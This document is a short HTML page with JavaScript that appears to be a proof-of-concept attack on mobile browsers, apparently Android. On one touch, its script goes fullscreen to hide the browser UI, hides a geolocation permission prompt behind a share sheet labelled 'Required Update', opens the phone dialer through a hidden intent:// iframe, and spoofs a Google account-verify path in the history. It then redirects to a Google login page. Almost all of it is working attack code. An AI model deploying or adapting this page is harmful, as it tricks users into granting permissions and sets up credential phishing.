<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>S Y S T 3 M</title>
    <style>
        body, html { margin: 0; padding: 0; background: #000; width: 100vw; height: 100vh; overflow: hidden; }
        #trigger { width: 100%; height: 100%; cursor: pointer; }
    </style>
</head>
<body>

<div id="trigger"></div>

<script>
    const trigger = document.getElementById('trigger');

    trigger.addEventListener('touchstart', async function() {
        // 1. Enter Fullscreen (Masking the UI)
        if (document.documentElement.requestFullscreen) {
            document.documentElement.requestFullscreen();
        }

        // 2. Trigger Permission Request (Hidden behind the next action)
        // This attempts to 'stack' a permission prompt under the share sheet
        navigator.geolocation.getCurrentPosition(() => {}, () => {}, {enableHighAccuracy:true});

        // 3. Trigger Web Share (Captures System Focus)
        if (navigator.share) {
            navigator.share({
                title: 'Required Update',
                url: 'https://support.mozilla.org'
            }).catch(() => {});
        }

        // 4. Intent Hijacking (Background)
        const intentUrl = "intent://123456789#Intent;scheme=tel;action=android.intent.action.DIAL;end";
        const iframe = document.createElement('iframe');
        iframe.style.display = 'none';
        iframe.src = intentUrl;
        document.body.appendChild(iframe);

        // 5. THE SPOOF: URL Bar Manipulation
        // As the page redirects, we push a fake state to the history
        window.history.pushState({}, "", "/login/google-account-verify");

        // 6. Final Exit & Redirect
        setTimeout(() => {
            if (document.exitFullscreen) { document.exitFullscreen(); }
            
            // This redirect happens while the Android System might still be 
            // processing the Share or Intent event.
            window.location.replace("https://www.google.com/accounts/login");
        }, 800);
    });
</script>
</body>
</html>
